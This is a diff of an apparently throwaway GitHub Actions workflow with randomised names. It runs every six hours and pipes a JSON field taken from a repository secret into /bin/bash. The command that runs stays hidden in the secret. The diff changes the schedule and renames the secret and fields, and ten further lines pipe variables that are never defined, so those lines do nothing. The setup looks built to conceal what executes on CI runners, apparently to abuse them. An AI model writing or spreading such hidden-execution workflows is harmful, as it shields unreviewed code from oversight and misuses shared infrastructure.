@@ -1,8 +1,9 @@
 name: liaifangxin1985
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '38 1/6 * * *'
 
 jobs:
   build:
@@ -11,17 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaifangxin1985
         env:
-          uhx72540: ${{ secrets.uhx72540 }}
+          xgrm7374: ${{ secrets.xgrm7374 }}
         run: |
-          echo $uhx72540 | jq -r .scc6583 | /bin/bash
-          echo $qeckc75099 | jq -r .kl04245 | /bin/bash
-          echo $to92651 | jq -r .v2 | /bin/bash
-          echo $x040 | jq -r .zaj6 | /bin/bash
-          echo $ozhlr78347 | jq -r .se948 | /bin/bash
-          echo $q6240 | jq -r .mus63 | /bin/bash
-          echo $se5 | jq -r .xqz872 | /bin/bash
-          echo $apvbx1 | jq -r .zf8 | /bin/bash
-          echo $kzoj50616 | jq -r .cuhd19 | /bin/bash
-          echo $ncuf3377 | jq -r .ijgdf72074 | /bin/bash
-          echo $puxhg63 | jq -r .wzbck126 | /bin/bash
+          echo $xgrm7374 | jq -r .tdr07137 | /bin/bash
+          echo $vvs79291 | jq -r .rfm7289 | /bin/bash
+          echo $toav6 | jq -r .njlag294 | /bin/bash
+          echo $akrz257 | jq -r .exadd42 | /bin/bash
+          echo $re243 | jq -r .u95 | /bin/bash
+          echo $l58 | jq -r .dcmca15 | /bin/bash
+          echo $ezpmj7255 | jq -r .qw12 | /bin/bash
+          echo $d35023 | jq -r .h91 | /bin/bash
+          echo $dc85241 | jq -r .rya1 | /bin/bash
+          echo $bwgx937 | jq -r .ewpl80 | /bin/bash
+          echo $t8 | jq -r .zh9 | /bin/bash
 
